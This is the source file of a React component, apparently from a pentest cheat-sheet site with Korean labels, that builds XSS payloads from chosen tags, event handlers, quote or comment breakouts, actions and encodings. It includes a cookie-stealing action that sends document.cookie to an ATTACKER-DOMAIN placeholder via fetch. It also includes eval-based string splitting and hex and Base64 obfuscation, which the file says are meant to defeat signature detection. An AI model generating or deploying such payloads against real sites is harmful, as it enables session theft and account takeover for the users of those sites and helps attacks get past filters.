import { useState } from 'react'
import { Clipboard } from 'lucide-react'

function escapeSingleQuoted(input: string): string {
  return input.replace(/\\/g, '\\\\').replace(/'/g, "\\'")
}

function splitCodeWithConcat(code: string): string {
  if (code.length < 4) return `'${escapeSingleQuoted(code)}'`
  const cut1 = Math.max(1, Math.floor(code.length / 3))
  const cut2 = Math.max(cut1 + 1, Math.floor((code.length * 2) / 3))
  return [code.slice(0, cut1), code.slice(cut1, cut2), code.slice(cut2)]
    .filter(Boolean)
    .map(part => `'${escapeSingleQuoted(part)}'`)
    .join('+')
}

function wrapEvalSplit(code: string): string {
  return `eval(${splitCodeWithConcat(code)})`
}

function hexEscape(code: string): string {
  return Array.from(code).map(ch => '\\x' + ch.charCodeAt(0).toString(16).padStart(2, '0')).join('')
}

function wrapEvalHex(code: string): string {
  return `eval("${hexEscape(code)}")`
}

function base64Encode(code: string): string {
  return btoa(unescape(encodeURIComponent(code)))
}

function wrapEvalBase64(code: string): string {
  return `eval(atob("${base64Encode(code)}"))`
}

function htmlEntityEncodeAll(input: string): string {
  return Array.from(input).map(ch => `&#${ch.codePointAt(0)};`).join('')
}

const XSS_TAGS: { id: string; label: string; noEvent?: boolean; template: (event: string, code: string) => string }[] = [
  { id: 'img', label: 'img', template: (event, code) => `<img src=x ${event}=${code}>` },
  { id: 'svg', label: 'svg', template: (event, code) => `<svg ${event}=${code}>` },
  { id: 'body', label: 'body', template: (event, code) => `<body ${event}=${code}>` },
  { id: 'iframe', label: 'iframe', template: (event, code) => `<iframe src=x ${event}=${code}></iframe>` },
  { id: 'input', label: 'input (autofocus)', template: (event, code) => `<input autofocus ${event}=${code}>` },
  { id: 'select', label: 'select (autofocus)', template: (event, code) => `<select autofocus ${event}=${code}></select>` },
  { id: 'textarea', label: 'textarea (autofocus)', template: (event, code) => `<textarea autofocus ${event}=${code}></textarea>` },
  { id: 'details', label: 'details (open)', template: (event, code) => `<details open ${event}=${code}></details>` },
  { id: 'marquee', label: 'marquee', template: (event, code) => `<marquee ${event}=${code}>` },
  { id: 'video', label: 'video', template: (event, code) => `<video ${event}=${code}><source src=x></video>` },
  { id: 'a', label: 'a (href)', noEvent: true, template: (_event, code) => `<a href="javascript:${code}">click</a>` },
  { id: 'script', label: 'script (직접 실행)', noEvent: true, template: (_event, code) => `<script>${code}</script>` },
]

const XSS_EVENTS = [
  { id: 'onerror', label: 'onerror' },
  { id: 'onload', label: 'onload' },
  { id: 'onclick', label: 'onclick' },
  { id: 'onmouseover', label: 'onmouseover' },
  { id: 'onfocus', label: 'onfocus' },
  { id: 'onmouseenter', label: 'onmouseenter' },
  { id: 'ontoggle', label: 'ontoggle' },
  { id: 'onstart', label: 'onstart' },
  { id: 'onwheel', label: 'onwheel' },
]

const XSS_BREAKOUTS = [
  { id: 'none', label: '없음 (그대로 삽입)', prefix: '' },
  { id: 'dquote-close', label: '"> 닫고 새 태그 삽입', prefix: '">' },
  { id: 'squote-close', label: "'> 닫고 새 태그 삽입", prefix: "'>" },
  { id: 'comment-close', label: '--!> HTML 주석 탈출', prefix: '--!>' },
  { id: 'cdata-close', label: ']]> CDATA 탈출 (XML)', prefix: ']]>' },
]

const XSS_ACTIONS: { id: string; label: string; code: string | null }[] = [
  { id: 'alert1', label: 'alert(1)', code: 'alert(1)' },
  { id: 'alertdomain', label: 'alert(document.domain)', code: 'alert(document.domain)' },
  { id: 'alertcookie', label: 'alert(document.cookie)', code: 'alert(document.cookie)' },
  { id: 'confirm1', label: 'confirm(1)', code: 'confirm(1)' },
  { id: 'custom', label: '커스텀 코드 직접 입력', code: null },
  { id: 'exfil', label: '쿠키를 지정 주소로 전송', code: null },
]

const XSS_ENCODINGS = [
  { id: 'none', label: '없음' },
  { id: 'html-entity', label: 'HTML 엔티티 인코딩' },
  { id: 'url', label: 'URL 인코딩' },
  { id: 'url-double', label: 'URL 이중 인코딩' },
  { id: 'hex', label: 'Hex 인코딩 (eval 조립)' },
  { id: 'base64', label: 'Base64 인코딩 (eval 조립)' },
]

export function XssPayloadBuilder() {
  const [breakout, setBreakout] = useState('none')
  const [tag, setTag] = useState('img')
  const [event, setEvent] = useState('onerror')
  const [action, setAction] = useState('alert1')
  const [customCode, setCustomCode] = useState('')
  const [exfilUrl, setExfilUrl] = useState('')
  const [splitCode, setSplitCode] = useState(false)
  const [encoding, setEncoding] = useState('none')
  const [copied, setCopied] = useState(false)

  const selectedTag = XSS_TAGS.find(t => t.id === tag) ?? XSS_TAGS[0]

  let code: string
  if (action === 'custom') code = customCode.trim() || 'alert(1)'
  else if (action === 'exfil') code = `fetch('${(exfilUrl.trim() || 'https://ATTACKER-DOMAIN')}?c='+document.cookie)`
  else code = XSS_ACTIONS.find(a => a.id === action)?.code ?? 'alert(1)'

  if (splitCode) code = wrapEvalSplit(code)
  if (encoding === 'hex') code = wrapEvalHex(code)
  else if (encoding === 'base64') code = wrapEvalBase64(code)

  const breakoutPrefix = XSS_BREAKOUTS.find(b => b.id === breakout)?.prefix ?? ''
  const assembled = breakoutPrefix + selectedTag.template(event, code)

  let finalPayload = assembled
  if (encoding === 'html-entity') finalPayload = htmlEntityEncodeAll(assembled)
  else if (encoding === 'url') finalPayload = encodeURIComponent(assembled)
  else if (encoding === 'url-double') finalPayload = encodeURIComponent(encodeURIComponent(assembled))

  const copy = async () => { await navigator.clipboard.writeText(finalPayload); setCopied(true); window.setTimeout(() => setCopied(false), 1500) }

  return <div className="xss-builder">
    <p className="cheatsheet-note">태그·이벤트·실행 코드·우회 기법을 각각 고르면 아래에 조합된 페이로드가 만들어집니다 — 허가된 대상에서만 사용하세요.</p>

    <label className="xss-builder-label">1. 삽입 위치 (컨텍스트 탈출)</label>
    <select className="xss-builder-select" value={breakout} onChange={event_ => setBreakout(event_.target.value)}>
      {XSS_BREAKOUTS.map(b => <option key={b.id} value={b.id}>{b.label}</option>)}
    </select>

    <label className="xss-builder-label">2. 벡터 (태그)</label>
    <select className="xss-builder-select" value={tag} onChange={event_ => setTag(event_.target.value)}>
      {XSS_TAGS.map(t => <option key={t.id} value={t.id}>{t.label}</option>)}
    </select>

    {!selectedTag.noEvent && <>
      <label className="xss-builder-label">이벤트</label>
      <select className="xss-builder-select" value={event} onChange={event_ => setEvent(event_.target.value)}>
        {XSS_EVENTS.map(ev => <option key={ev.id} value={ev.id}>{ev.label}</option>)}
      </select>
    </>}

    <label className="xss-builder-label">3. 실행 코드</label>
    <select className="xss-builder-select" value={action} onChange={event_ => setAction(event_.target.value)}>
      {XSS_ACTIONS.map(a => <option key={a.id} value={a.id}>{a.label}</option>)}
    </select>
    {action === 'custom' && <input className="cheatsheet-option-value" value={customCode} onChange={event_ => setCustomCode(event_.target.value)} placeholder="예: alert(document.domain)"/>}
    {action === 'exfil' && <input className="cheatsheet-option-value" value={exfilUrl} onChange={event_ => setExfilUrl(event_.target.value)} placeholder="https://내가-관리하는-수집서버"/>}

    <label className="xss-builder-label">4. 우회 기법</label>
    <label className="cheatsheet-option">
      <input type="checkbox" checked={splitCode} onChange={event_ => setSplitCode(event_.target.checked)}/>
      <span className="cheatsheet-option-body">
        <span className="cheatsheet-option-head"><b>문자열 분리 후 eval 조립</b></span>
        <small>'doc'+'ume'+'nt' 처럼 코드를 조각내 이어붙인 뒤 eval로 실행합니다 — 리터럴 문자열 시그니처 탐지를 우회합니다.</small>
      </span>
    </label>
    <select className="xss-builder-select" value={encoding} onChange={event_ => setEncoding(event_.target.value)}>
      {XSS_ENCODINGS.map(enc => <option key={enc.id} value={enc.id}>{enc.label}</option>)}
    </select>
    <p className="cheatsheet-note">Hex·Base64는 코드를 eval로 감싸 인코딩하므로 그대로 실행됩니다. HTML 엔티티·URL 인코딩은 조립된 전체 태그 문자열에 적용되므로, 반사 위치나 디코딩 지점에 맞게 사용하세요.</p>

    <div className="cheatsheet-command-bar">
      <pre className="cheatsheet-command">{finalPayload}</pre>
      <button className="cheatsheet-copy" onClick={copy}><Clipboard size={14}/>{copied ? '복사됨' : '복사'}</button>
    </div>
  </div>
}
